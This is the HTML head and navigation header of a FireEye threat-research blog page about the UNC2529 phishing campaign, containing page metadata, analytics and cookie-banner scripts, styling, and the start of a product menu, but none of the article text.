
<!DOCTYPE html>
<html>
<head>

<script>
    var companyDetails6Sense = localStorage.getItem('_6senseCompanyDetails');

    if(null != companyDetails6Sense || companyDetails6Sense != "" || companyDetails6Sense != undefined){
		var jsonVal = JSON.parse(companyDetails6Sense);

        var companyRevenueRange = jsonVal.company.revenue_range;
        var companyCountry = jsonVal.company.country;
        var companyIndustry = jsonVal.company.industry;
        var companyName = jsonVal.company.name;
        var companyRegion = jsonVal.company.region;
        var companyDomain = jsonVal.company.domain;
    	var segments = JSON.stringify(jsonVal.segments);
    	
        window.dataLayer=window.dataLayer ||[];
        window.dataLayer.push({
                "company_industry" : companyIndustry,
                "company_name" : companyName,
                "company_revenue" : companyRevenueRange,
                "company_country" : companyCountry,
                "company_region" : companyRegion,
            	"company_domain" : companyDomain,
            	"segments" : segments
        });
    }

</script>

<style>.async-hide { opacity: 0 !important} </style>
<script>(function(a,s,y,n,c,h,i,d,e){s.className+=' '+y;h.start=1*new Date;
h.end=i=function(){s.className=s.className.replace(RegExp(' ?'+y),'')};
(a[n]=a[n]||[]).hide=h;setTimeout(function(){i();h.end=null},c);h.timeout=c;
})(window,document.documentElement,'async-hide','dataLayer',4000,
{"GTM-5ZX7QTZ":true});</script>

<title>The UNC2529 Triple Double: A Trifecta Phishing Campaign | FireEye Inc</title>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<link rel="alternate" type="application/atom+xml" title="Atom Feed for &#39;The UNC2529 Triple Double: A Trifecta Phishing Campaign&#39;" href="/content/fireeye-www/en_US/blog/threat-research/2021/05/unc2529-triple-double-trifecta-phishing-campaign/_jcr_content.feed">
<link rel="canonical" href="https://www.fireeye.com/blog/threat-research/2021/05/unc2529-triple-double-trifecta-phishing-campaign.html">
<meta name="language" content="en">
<meta name="locale" content="en_US">
<meta http-equiv="cleartype" content="on">
<meta name="HandheldFriendly" content="True">
<meta name="MobileOptimized" content="320">
<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0">
<meta name="description" content="We observed a widespread, global phishing campaign from UNC2529 targeting numerous organizations across an array of industries.
">

<meta itemprop="name" content="The UNC2529 Triple Double: A Trifecta Phishing Campaign">
<meta itemprop="description" content="We observed a widespread, global phishing campaign from UNC2529 targeting numerous organizations across an array of industries.
">
<meta itemprop="image" content="https://www.fireeye.com/content/dam/fireeye-www/fw/images/fireeye-2-color-square.png">

<meta name="twitter:site" content="@FireEye">
<meta name="twitter:title" content="The UNC2529 Triple Double: A Trifecta Phishing Campaign">
<meta name="twitter:description" content="We observed a widespread, global phishing campaign from UNC2529 targeting numerous organizations across an array of industries.
">
<meta name="twitter:creator" content="@FireEye">
<meta name="twitter:image" content="https://www.fireeye.com/content/dam/fireeye-www/fw/images/fireeye-2-color-square.png">

<meta property="og:title" content="The UNC2529 Triple Double: A Trifecta Phishing Campaign">
<meta property="og:type" content="website">
<meta property="og:url" content="https://www.fireeye.com/blog/threat-research/2021/05/unc2529-triple-double-trifecta-phishing-campaign.html">
<meta property="og:image" content="https://www.fireeye.com/content/dam/fireeye-www/fw/images/fireeye-2-color-square.png">
<meta property="og:description" content="We observed a widespread, global phishing campaign from UNC2529 targeting numerous organizations across an array of industries.
">
<meta property="og:site_name" content="FireEye">
<meta property="fb:admins" content="45127269202">
<script type="text/javascript" src="/etc.clientlibs/clientlibs/granite/jquery.min.js"></script>

<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
    new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
    j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
    'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
    })(window,document,'script','dataLayer','GTM-MVGC8KK');</script>


<script type="text/javascript" src="/etc.clientlibs/clientlibs/granite/jquery/granite/csrf.min.js"></script>
<script type="text/javascript" src="/etc/designs/fireeye-www/clientlibs_nav.min.js"></script>
<script type="text/javascript">
var cookiesOK = $.cookie("ec-privacy");
var fdc =fdc || {};
var onAccept = function () {
	$.cookie("ec-privacy", "accept", { path: "/", expires: 365 });
	jQuery("#cookie-privacy-banner").hide();
};

var onDecline = function () {
	$.cookie("ec-privacy", "decline", { path: "/", expires: 365 });
	jQuery("#cookie-privacy-banner").hide();
};

var ipLocation = (function () {
	var banner ="#cookie-privacy-banner";

	/* Show the privacy notification banner. */
	var showBanner = function (banner) {
		jQuery(banner).show();
	};

	/* Suppress the privacy notification banner. */
	var hideBanner = function (banner) {
		jQuery(banner).hide();
	};

	/* These are the country codes for the countries subject to EC privacy laws.
	 * We will check to see if a visitor is coming from one of these countries.
	 * If they are, we display a privacy notification banner. If not, we
	 * do nothing. */
	var countries = {
		"AT": true,"BE": true,"BG": true,"HR": true,"CY": true,"CZ": true,"DK": true,
		"EE": true,"FI": true,"FR": true,"DE": true,"GR": true,"HU": true,"IE": true,
		"IT": true,"LV": true,"LT": true,"LU": true,"MT": true,"NL": true,"PL": true,
		"PT": true,"RO": true,"SK": true,"SI": true,"ES": true,"SE": true,"GB": true
	};
	var defaultSite = "US";

	var onSuccess = function (geoipResponse) {
		fdc.geoipresponse=geoipResponse;
		/* There's no guarantee that a successful response object
		 * has any particular property, so we need to code defensively. */
		if (!geoipResponse.country.iso_code) {
			hideBanner(banner);
			return;
		}
		//
		if (location.host.indexOf("stage") >= 0 && geoipResponse.country.iso_code === "SG") {
            geoipResponse.country.iso_code = "ES"
        }
		/* ISO country codes are in upper case. */
		var code = geoipResponse.country.iso_code;
			
		
		if ((countries[code]) && (cookiesOK == undefined)) {
			showBanner(banner);
		}
		else {
			hideBanner(banner);
		}
	};

	/* We don't really care what the error is. */
	var onError = function (error) {
		hideBanner(banner);
	};

	return function () {
		geoip2.country( onSuccess, onError );
	};
}());
ipLocation();
</script>
<div class="htmlpassthru_836d htmlpassthru">

<script type="text/javascript">
    if (!String.prototype.includes) {
        String.prototype.includes = function() {
            return String.prototype.indexOf.apply(this, arguments) !== -1;
        };
    }
var userAgent = navigator.userAgent,
gomezAgent = userAgent.includes("GomezAgent"),
prtgAgent = userAgent.includes("PRTG Network Monitor");

if (gomezAgent || prtgAgent) {
    cookiesOK = "decline";
}

if (cookiesOK != "decline") {
    // Google Analytics was here. Now it's in Tealium and GTM.
}
// Temporary patch for AA issue.
if(typeof _satellite == "undefined") {
    _satellite = {};
    _satellite.track = function(){};
}
</script>
<style>
@media ( max-width : 959px) {
    .g04 .megamenu .n03-sub_table .n03-sub_cell, .g04 .megamenu .separator {
        display: block;
    }
    .g04 .megamenu .n03_list-item-sub>.megamenu-cta {
        padding: 0;
    }
    .g04 .megamenu .n03-sub_cell.n03-sub_cell-utility {
        padding: 11px 0 11px 10px;
    }
}

@media ( min-width : 48em) {
    .cta-bar .n01 .n01_cell {
        width: auto;
    }
}

/* styles for the CTA bar test */
.n01.n01v1 .n01_cell {
    background-color: #222;
    border: 1px solid #444;
}

.n01.n01v1 .n01_cell .ficon, .n01.n01v1 .n01_cell .n01_label, .n01.n01v1 .n01_text
    {
    color: #fff;
}

@media ( min-width : 48em) {
    .n01.n01v1 .n01_cell {
        background-color: transparent;
        border: none;
    }
    .n01.n01v1 .n01_link {
        background-color: #222;
        border: 1px solid #444;
        border-right: 0;
    }
}
/* fix for new footer */
.g03v1 .g03-s-i:after {
    left: -3px;
}
/* fix for tables */
span.nowrap {
    white-space: nowrap;
}
/* fix for blog cta */
.blog-cta {
    border: 1px solid #dadadb;
    background-color: #ebebed;
    margin-bottom: 10px;
    line-height: 0;
}
</style>
<link rel="stylesheet" type="text/css" href="https://cloud.typography.com/6746836/6977592/css/fonts.css" />
<link rel="stylesheet" type="text/css" href="/content/dam/fireeye-www/fw/css/patch.css?v=1" />
<script type="text/javascript">
var addthis_config = addthis_config||{};
    addthis_config.data_track_clickback = false;
var addthis_share = {
   url: window.location.href
};
</script>
<style>
/* fix for IE */
.uc-he01v1 .uc-he01_container .background {
    max-height: 470px;
    position: absolute;
}
.uc-he01v2 .uc-he01_container .background {
    position: absolute;
}
@media (max-width: 48em) {
    .uc-he01v1 .uc-he01_container .background {
        max-height: 320px;
    }
}
@media (min-width: 54em) {
    .uc-he01v1 .uc-he01_container .background {
        max-height: 600px;
    }
}
</style>
<style>
/* Update the images used in the Table component. */
.c09v1 .tablesorter-default .header, .c09v1 .tablesorter-default .tablesorter-header {
background-position-x: calc(100% - 4px);
background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAwAAAAUCAYAAAC58NwRAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyZpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMTQwIDc5LjE2MDQ1MSwgMjAxNy8wNS8wNi0wMTowODoyMSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIDIwMTggTWFjaW50b3NoIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjc2NDE0RUUyNjc2QjExRThBNEFDQTFFRUMyNzIyRjM4IiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOjc2NDE0RUUzNjc2QjExRThBNEFDQTFFRUMyNzIyRjM4Ij4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6NTg5MzI0RkY2NzZCMTFFOEE0QUNBMUVFQzI3MjJGMzgiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6NTg5MzI1MDA2NzZCMTFFOEE0QUNBMUVFQzI3MjJGMzgiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz567IGQAAAApklEQVR42mL8//8/A0kApAELlgJiG2xyTDjMcQFiayDmRJfApkEbiJWgiq2J0eCCxLYBYkF8GjAUAIEvLg2C2JwAdZ42Ng022DyJ7kwmJFOM8YS+INRABkZSI45sDSAnxRFQuweIj8D8cA+Iz+JR/B6kGD2UQALf8ZiOEawgU45iUQyy/SqumD4C1YgMNhNKS3vwGYBNw1WoM75jdSKpGYjkiAMIMAAPu279CuYueAAAAABJRU5ErkJggg==)
}
.c09v1 .tablesorter-default thead .headerSortUp,.c09v1 .tablesorter-default thead .tablesorter-headerSortUp,.c09v1 .tablesorter-default thead .tablesorter-headerAsc{background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAwAAAAUCAYAAAC58NwRAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyZpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMTQwIDc5LjE2MDQ1MSwgMjAxNy8wNS8wNi0wMTowODoyMSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIDIwMTggTWFjaW50b3NoIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjU4OTMyNEY5Njc2QjExRThBNEFDQTFFRUMyNzIyRjM4IiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOjU4OTMyNEZBNjc2QjExRThBNEFDQTFFRUMyNzIyRjM4Ij4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6NTg5MzI0Rjc2NzZCMTFFOEE0QUNBMUVFQzI3MjJGMzgiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6NTg5MzI0Rjg2NzZCMTFFOEE0QUNBMUVFQzI3MjJGMzgiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz5TuQesAAAAp0lEQVR42mL8//8/A0kApAELNgbicmxyuDTsBuJ3QCxIjIbQ/wjQQYyGu/9RgRI+DeX/McFuXBqUoO7GBkKxaZj5Hze4i67B5T9hAA5mRlIjjmwNSkAcR0DtHiA+wgTl3APis3gUvwcpBjGYkARBAt/xmM6ArgFkylEsikG2X8WmAWbLezSxzcgcJnzWYzMAm4arUGd8x+pEHPlBCohtsMmRHHEAAQYAbP+KkOIl8zUAAAAASUVORK5CYII=)}
.c09v1 .tablesorter-default thead .headerSortDown,.c09v1 .tablesorter-default thead .tablesorter-headerSortDown,.c09v1 .tablesorter-default thead .tablesorter-headerDesc{background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAwAAAAUCAYAAAC58NwRAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyZpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMTQwIDc5LjE2MDQ1MSwgMjAxNy8wNS8wNi0wMTowODoyMSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIDIwMTggTWFjaW50b3NoIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjU4OTMyNEZENjc2QjExRThBNEFDQTFFRUMyNzIyRjM4IiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOjU4OTMyNEZFNjc2QjExRThBNEFDQTFFRUMyNzIyRjM4Ij4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6NTg5MzI0RkI2NzZCMTFFOEE0QUNBMUVFQzI3MjJGMzgiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6NTg5MzI0RkM2NzZCMTFFOEE0QUNBMUVFQzI3MjJGMzgiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz6nOhWUAAAAqElEQVR42mL8//8/AymACYe4FBDbkKLBBYitgZiTGA3aQKwEVWxNjAYXJDbIWYL4NGAoAAJfXBoEsTkB6jxtbBpssHkS3ZlMSKYY4wl+QVgwM1Ir4ghqALnxPwFcDlYJchIUz/yPG9yFqUPWoATE73BoCMWmAYTLsSjejawGXQMD1HpkoERIQyiS4g50eWwaGKDOAPlHEF2OBUdwV0CD+j26BMkxDRBgALvSCpUQlZEGAAAAAElFTkSuQmCC)}
.c09v1 .tablesorter-default thead .sorter-false {
    background-image: none;
}
@media (max-width: 41.9125em){
    .c09.c09v1.has-data-label tr>:not(:first-child):before {
        width: auto; min-width: 35%;
    }
}
</style>
<script>
$(document).ready(function(){
    if(typeof(ipLocation) !== "undefined" && typeof fdc.geoipResponse === "undefined"){ipLocation();}
    if(typeof fdc.geoipResponse !== "undefined"){showCountryNotification(fdc.geoipResponse);}
    if(typeof fdc.geoipResponse !== "undefined" && typeof fdc.geoipResponse.country !== "undefined" && fdc.geoipResponse.country.is_in_european_union && ($.cookie("ec-privacy") == undefined)){jQuery("#cookie-privacy-banner").show();}
});
function showCountryNotification(geoipResponse) {
	if (!geoipResponse.country || !geoipResponse.country.iso_code) {
        return;
    }
	var code = geoipResponse.country.iso_code,
	    langIndex = code === "FR" ? 2 : code === "DE" ? 3 : code === "JP" ? 4 : code === "KR" ? 5 : 1;
	if (langIndex > 1) {
		$('.c08_modal.lang').addClass("is-open");
		$('.c08_modal.lang .col:nth-child(' + (langIndex - 1) + ')').show();
		$('.c08_modal.lang, .c08_modal.lang [data-behavior="dismiss-c08"]').click(function(){
		    $.cookie("country-notification", "decline", { path: "/", expires: 365 });
		    closec08();
		});
		$('.c08_modal.lang .c08').click(function(e){
		    e.stopPropagation();
		});
		if (($.cookie("country-notification") === "decline") || $(".g01_options_list li:nth-child(" + langIndex + ") a").attr("href").indexOf(".html") < 0) {
		    closec08();
		} else {
		    $(".c08_modal.lang .btn").eq(langIndex - 2).attr("href", $(".g01_options_list li:nth-child(" + langIndex + ") a").attr("href"));
		}
	}
}
</script>
<script>    
     var _6SenseJsonObj = localStorage.getItem('_6senseCompanyDetails'),
         _6SenseTime = localStorage.getItem('_6senseCompanyDetails-timestamp'),
         isJsonStale = _6SenseTime === null ? true : Date.now() - parseInt(_6SenseTime) > 86400000; // 86400000 = 1 day in ms
     
     window._6si = window._6si || [];
     window._6si.push(['enableEventTracking', true]);
     window._6si.push(['setToken', '1322340356018696d853e0ac6f7ce3a2']);
     window._6si.push(['setEndpoint', 'b.6sc.co']);
     if(_6SenseJsonObj === null || isJsonStale){
       window._6si.push(['enableCompanyDetails', true]);
       window._6si.push(['setEpsilonKey', '325d6d60e24c7cfc3a782839d85ce08c8d3bb27c']);
       localStorage.setItem('_6senseCompanyDetails-timestamp', Date.now());
     }  
    (function () {
          var gd = document.createElement('script');
      gd.type = 'text/javascript';
      gd.async = true;
      gd.src = '//j.6sc.co/6si.min.js';
      var s = document.getElementsByTagName('script')[0];
      s.parentNode.insertBefore(gd, s);
     })();
</script>
<script>
    var jsonObj;

    function targetPageParams() { 
        jsonObj = localStorage.getItem('_6senseCompanyDetails');
        if(jsonObj) {
        	var jsonVal = JSON.parse(jsonObj);
            return { 
                "companyRevenueRange": jsonVal.company.revenue_range, 
                "companyCountry": jsonVal.company.country, 
                "companyIndustry": jsonVal.company.industry,
                "companyName": jsonVal.company.name,
                "companyRegion": jsonVal.company.region,
                "companyDomain": jsonVal.company.domain,
                "segments": JSON.stringify(jsonVal.segments)
            }; 
        }
     }; 
</script>
<script>
$(document).ready(function(){
    $(".loadmore").on("click", function(){$(".list.parbase").addClass("no-max-height");});
    // Don't show title text for textures.
    $(".texture img").attr("title", "");
});
</script>
<style>
.no-max-height .c11v9 h4{
    max-height: none !important;
}
.g04 #header-search .search-field_submit:after {
    font-size: 9px;
}
.c11v8.hideLinkText .btn {
    display: inline-block;
}
/* CTA fix */
.g04 .megamenu-tab .has-inner-cta .n03-sub_container {
    padding: 0;
    margin: 0 0 0 10px;
    max-width: 1210px;
}
.g04 .megamenu-tab .has-inner-cta .col-wrap {
    padding: 40px 0;
}
.g04 .n03-sub_container[data-columns="1"] .megamenu-cta {
    width: 50%;
}
.g04 .n03-sub_container[data-columns="2"] .megamenu-cta {
    width: 33.9%;
}
.g04 .has-inner-cta > [data-columns="2"] .n03-sub_cell {
    width: calc(50% - 60px);
}
.g04 .n03-sub_container[data-columns="3"] .megamenu-cta {
    width: 25%;
}
.g04 .n03-sub_container[data-columns="4"] .megamenu-cta {
    width: 20%;
}
.g04 .megamenu-cta h5 {
    line-height: 1.4;
}
html .g04 header .megamenu-cta h5 {
    font-weight: 500;
    font-size: 15px;
    color: #44474d;
}
html .g04 header .megamenu-cta p {
    font-weight: 300;
    color: #44474d;
}
.g04 .n03-sub_table > .megamenu-cta {
    background: none;
    padding: 0;
}
.g04 .megamenu-cta .n03_utility {
    border: none;
    height: 100%;
}
.g04 .megamenu-cta .n03_utility_cell {
    display: block;
    width: auto;
    margin-left: 30px;
}
/* Un/re-comment to add/remove in the line to the left of the CTA in the megamenu. */
.g04 .n03-sub_table .col-wrap:not(:last-child) .separator.disabled {
    border-right-color: #ebebed;
}

/* Put a grid over the texture from a neighboring grid. */
.force {
    z-index: 15;
    position: relative;
}
/* Remove the gradient above the tiles on blog pages and reduce the space there. */
.iparsys + .l_container>div.gradient-top {
    background-image: none;
}
.iparsys + .l_container>.gradient-top>div>.g {
    padding: 0;
}
@media (min-width: 35em) {
    .entries .highlightFirst .c11v9 .c11-image-div {
        border-left: 1px solid #dadadb;
        border-right: 1px solid #dadadb;
    }
}
@media (max-width: 1024px) {
    .uc-he01v2 .panel .asset .image img {
        max-height: 200px;
	max-width: 300px;
    }
}
/* mobile view for MegaMenu CTA. */
@media (max-width: 1024px) {
    .g04 .megamenu-tab.open .n03_list-item-sub.has-inner-cta {
        padding-bottom: 0;
    }
    .g04 .has-inner-cta > [data-columns="2"] .n03-sub_cell,
    .g04 .n03-sub_container[data-columns="2"] .megamenu-cta {
        width: 100%;
        display: block;
    }
    .g04 .megamenu-tab .has-inner-cta .n03-sub_container {
        margin: 0;
    }
    .g04 .megamenu-tab .has-inner-cta .n03-sub_container .col-wrap {
        padding: 0;
    }
    .g04 .megamenu-cta .n03_utility_cell {
        margin-left: 15px;
        margin-right: 22px;
    }
    .g04 .megamenu-cta .n03_utility_cell:nth-child(1) {
        padding-bottom: 0;
    }
    .g04 .megamenu-cta .n03_utility_cell:nth-child(2) {
        padding-top: 0;
    }
    .g04 .megamenu-cta .n03_utility_cell h5,
    .g04 .megamenu-cta .n03_utility_cell p {
        font-size: 12px;
    }
    .content-2-par .megamenus .n03-sub_table .megamenu-cta {
        border-radius: 0;
    }
}
/* Training pages side design. */
  .training-side-box {background: url('/content/dam/fireeye-www/brand/homepage-banner-images/hpb-bg-testimonial-red.jpg') left no-repeat; background-size: cover; padding:30px; border: 1px solid #dadadb; margin-bottom: 20px;}
  .training-side-text {color: #ffffff;}
  .training-side-text a:hover {color: #ffffff; text-decoration: underline;}

/* Avoid column breaks in ordered lists. */
  .c00 ol > li {page-break-inside: avoid; margin-bottom: 15px;}

/* Safari needs this on html to stop side scrolling, not just on the body. */
html {overflow-x:hidden;}
/* Make sure the footer is above a texture that precedes it. */
#g03-footer {z-index: 725;}
/* Allow border for linked images. */
.border>a>img {border: 1px solid #dadadb;}
/* Allows for easy scrollable text boxes on blog pages right in the Blog Text component. */
table.limitedHeight td {
    height: 350px;
    display: block;
    overflow-y: scroll;
    overflow-x: hidden;
    padding-bottom: 0;
}
/* Fix for edge case in Safari where page title in breadcrumbs wraps when the title is just the right length. */
.g02_list_item:last-child span {
    min-width: 360px;
    display: block;
}
/* fix issue of hidden Event Spotlights having margin when used with .row-count-2 */
.parsys > .spotlight-event.section:empty {
    display: none;
}
@media (min-width: 60em) {
.row-count-2 .parsys>div:nth-child(even):not(:empty) {
    margin-right: 40px;
}
}
</style></div>

<link rel="stylesheet" href="/etc/designs/fireeye-www/clientlibs_fw-2019.min.css" type="text/css">
<link rel="stylesheet" href="/etc/clientlibs/fireeye-blog/clientlibs_base.min.css" type="text/css">
<link rel="icon" type="image/vnd.microsoft.icon" href="/content/dam/fireeye-www/brand/logos/fireeye.ico">
<link rel="shortcut icon" type="image/vnd.microsoft.icon" href="/content/dam/fireeye-www/brand/logos/fireeye.ico">
</head>

<body itemscope itemtype="http://schema.org/WebPage" data-redesign="redesign-2019"><script type="text/javascript">window.Granite = window.Granite || {}; window.Granite.csrf = true;</script>


<div class="clientcontext parbase"><script type="text/javascript" src="/etc.clientlibs/clientlibs/granite/utils.min.js"></script>
<script type="text/javascript" src="/etc.clientlibs/clientlibs/granite/jquery/granite.min.js"></script>
<script type="text/javascript" src="/etc.clientlibs/foundation/clientlibs/jquery.min.js"></script>
<script type="text/javascript" src="/etc.clientlibs/foundation/clientlibs/shared.min.js"></script>
<script type="text/javascript" src="/etc.clientlibs/clientlibs/granite/lodash/modern.min.js"></script>
<script type="text/javascript" src="/etc.clientlibs/cq/personalization/clientlib/personalization/kernel.min.js"></script>
<script type="text/javascript">
    $CQ(function() {
        CQ_Analytics.SegmentMgr.loadSegments("\/etc\/segmentation");
        CQ_Analytics.ClientContextUtils.init("\/etc\/clientcontext\/default", "\/content\/fireeye\u002Dwww\/en_US\/blog\/threat\u002Dresearch\/2021\/05\/unc2529\u002Dtriple\u002Ddouble\u002Dtrifecta\u002Dphishing\u002Dcampaign");

        
    });
</script>
</div>


<div class="masthead_v2 masthead-v2">
<div class="g04 masthead g04v1">


<div class="bottom-bar">
<div class="tab">
<span class="ficon ficon-warning"></span>
<p><a class="contact_bar" href="/company/incident-response.html">Report an Incident</a></p>
</div>
<div class="tab">
<span class="ficon ficon-phone2"></span>
<p><a class="contact_bar" href="/company/contact-us.html">Contact Us</a></p>
</div>
</div>
<div class="cta-bar">
<div class="content-well">
<ul>
<li>
<a class="contact_bar" href="/company/contact-us.html">
<span class="g04_label">Contact Us</span><span class="g04_icon"><span class="ficon ficon-phone3"></span></span>
</a>
</li>
<li style="display: none;" id="liveagent_button_online_573a00000008kP3">
<a class="contact_bar" href="javascript://Chat" onclick="liveagent.startChat('573a00000008kP3')">
<span class="g04_label">Chat with an Expert</span><span class="g04_icon"><span class="ficon ficon-chat"></span></span>
</a>
</li>
<li class="red">
<a class="contact_bar" href="/company/incident-response.html">
<span class="g04_label">Report an Incident</span><span class="g04_icon"><span class="ficon ficon-incident"></span></span>
</a>
</li>
</ul>
</div>
</div>

<script type="text/javascript">
    if (!window._laq) { window._laq = []; }
    window._laq.push(function(){
    	liveagent.showWhenOnline('573a00000008kP3', document.getElementById('liveagent_button_online_573a00000008kP3'));
    });
</script>
<script type="text/javascript" src="https://c.la2c2.salesforceliveagent.com/content/g/js/34.0/deployment.js"></script>
<script type="text/javascript">
    liveagent.init("https://d.la2c2.salesforceliveagent.com/chat", "572a0000000H8aJ", "00D3000000063LS");
</script><header role="banner" itemscope itemtype="http://schema.org/WPHeader">
<div class="language-and-search"> <div class="search">
<div class="content-searchbox searchbox">
<a class="g01_options-option option-search" href="#header-search" data-for="q" data-behavior="showHeaderMenu focusField">Search</a>
<div class="option-menu option-menu_search" id="header-search">
<form method="get" action="/search.html">
<fieldset class="search-field" title="Search FireEye.com">
<label class="search-field_label" for="q">Search FireEye.com</label>
<input class="input-text search-field_text" type="text" name="q" id="q" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" data-locale="en_US" placeholder="Search FireEye.com">
<div id="searchboxsuggestions"></div>
<button class="btn btn-secondary search-field_submit" type="submit">Go</button>
</fieldset>
</form>
</div>
</div>
</div>
</div>
<div class="logo-and-megamenu">
<div class="logo" itemscope itemtype="https://schema.org/Brand">
<a href="https://www.fireeye.com"><img src="/content/dam/fireeye-www/fw/images/fe-logo-color.svg" alt="FireEye" itemprop="logo" class="fireeye" /></a>
</div>
<nav class="megamenu">
<ul><li class="megamenu-tab" data-curry="/blog.html" data-link="/products.html">
<h4 class="megamenu-title">
<a href="/products.html" itemprop="url" class="MegaMenus">Products</a>
</h4>
<div class="content-0-par parsys"><div class="megamenus section">

<div class="n03_list-item-sub has-inner-cta ">
<div class="n03-sub_container" data-columns="2">
<div class="n03-sub_table">
<div class="col-wrap">
<div class="n03-sub_cell">
<div class="parsys"><div class="megamenu-list section">
<h4 class="n03-sub_title">Enterprise Security</h4><ul><li itemprop="url"><a href="/products/helix.html" itemprop="name" class="MegaMenus">Helix Security Platform</a></li>
<li itemprop="url"><a href="/products/network-security.html" itemprop="name" class="MegaMenus">Network Security and Forensics</a></li>
<li itemprop="url"><a href="/products/endpoint-security.html" itemprop="name" class="MegaMenus">Endpoint Security</a></li>
<li itemprop="url"><a href="/products/email-security.html" itemprop="name" class="MegaMenus">Email Security</a></li>
<li itemprop="url"><a href="/products/cloudvisory.html" itemprop="name" class="MegaMenus">Cloudvisory</a></li>
<li itemprop="url"><a href="/products/detection-on-demand.html" itemprop="name" class="MegaMenus">Detection On Demand</a></li>
